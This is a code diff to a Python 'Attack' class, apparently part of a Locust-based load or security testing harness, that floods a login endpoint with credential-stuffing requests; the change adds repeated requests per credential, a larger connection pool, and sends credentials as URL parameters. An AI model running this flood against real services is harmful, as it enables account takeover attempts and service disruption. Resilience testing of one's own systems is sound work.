@@ -5,6 +5,11 @@ import logging
 import random
 import requests
 
+try:
+    from urllib3.util.retry import Retry
+except ImportError:
+    Retry = None
+
 
 class Attack:
     """Credential stuffing flood targeting the user/authentication service."""
@@ -19,7 +24,6 @@ class Attack:
         self.test_identifier = test_identifier
         self.base_url = (configuration.get("locust_host_url") or "").rstrip("/")
         self.login_path = configuration.get("attack_login_path") or "/login"
-        # Space-separated list of user:pass entries
         raw_creds = configuration.get("attack_credentials") or "user@example.com:password"
         self.credentials = []
         for entry in raw_creds.split():
@@ -38,24 +42,33 @@ class Attack:
             self.delay_between_batches = max(0.0, float(delay_between_batches))
         except (TypeError, ValueError):
             self.delay_between_batches = 0.0
+        burst = configuration.get("attack_login_requests_per_credential")
+        try:
+            self.requests_per_credential = max(1, int(float(burst)))
+        except (TypeError, ValueError):
+            self.requests_per_credential = 5
 
     def worker(self, end_ts, stop_event):
         session = requests.Session()
+        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
+        session.mount("http://", adapter)
+        session.mount("https://", adapter)
         url = f"{self.base_url}{self.login_path}"
-        headers = {"Content-Type": "application/json"}
         while (time.time() < end_ts) and (not stop_event.is_set()):
             for username, password in self.credentials:
                 if (time.time() >= end_ts) or stop_event.is_set():
                     break
-                try:
-                    chosen_password = password
-                    if self.invalid_ratio > 0 and random.random() < self.invalid_ratio:
-                        chosen_password = f"{password}#invalid"
-                    body = {"username": username, "password": chosen_password}
-                    session.post(url, json=body, headers=headers, timeout=self.timeout)
-                except Exception:
-                    # best-effort flood; ignore
-                    pass
+                for _ in range(self.requests_per_credential):
+                    if (time.time() >= end_ts) or stop_event.is_set():
+                        break
+                    try:
+                        chosen_password = password
+                        if self.invalid_ratio > 0 and random.random() < self.invalid_ratio:
+                            chosen_password = f"{password}#invalid"
+                        params = {"username": username, "password": chosen_password}
+                        session.post(url, params=params, timeout=self.timeout)
+                    except Exception:
+                        pass
             if self.delay_between_batches > 0:
                 stop_event.wait(timeout=self.delay_between_batches)
 
